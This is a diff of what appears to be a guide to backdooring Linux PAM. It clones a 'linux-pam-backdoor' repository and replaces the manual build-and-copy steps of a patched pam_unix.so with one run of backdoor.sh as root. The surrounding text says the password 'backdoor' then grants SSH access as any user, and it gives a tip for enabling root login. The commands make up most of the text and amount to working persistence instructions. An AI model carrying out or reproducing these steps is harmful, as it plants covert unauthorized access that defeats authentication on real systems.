@@ -43,28 +43,9 @@ git clone https://github.com/segmentati0nf4ult/linux-pam-backdoor.git
 
 cd linux-pam-backdoor
 
-# I was a bit lazy to fix compilation errors in an initial script so follow these instructions instead:
-
-./backdoor.sh -v $(dpkg -l | grep libpam-mod | awk -F " " '{print $3}' | awk -F "-" '{print $1}' | sort -u) -p backdoor
-
-cd linux-pam-1.5.3/
-
-make distclean
-./autogen.sh
-./configure --disable-doc
-make
-
-cd ../
-
-./backdoor.sh -v $(dpkg -l | grep libpam-mod | awk -F " " '{print $3}' | awk -F "-" '{print $1}' | sort -u) -p backdoor
-
 sudo su
 
-cp pam_unix.so /lib/x86_64-linux-gnu/security/
-
-systemctl daemon-reload
-systemctl restart ssh
-
+./backdoor.sh -v $(dpkg -l | grep libpam-mod | awk -F " " '{print $3}' | awk -F "-" '{print $1}' | sort -u) -p backdoor
 ```
 
 Now using `ssh localuser@10.6.15.4` with the password `backdoor` will grant you access for any user. (If doesn't work for `root` user, make sure `PermitRootLogin` is set to `yes` in `/etc/ssh/sshd_config`
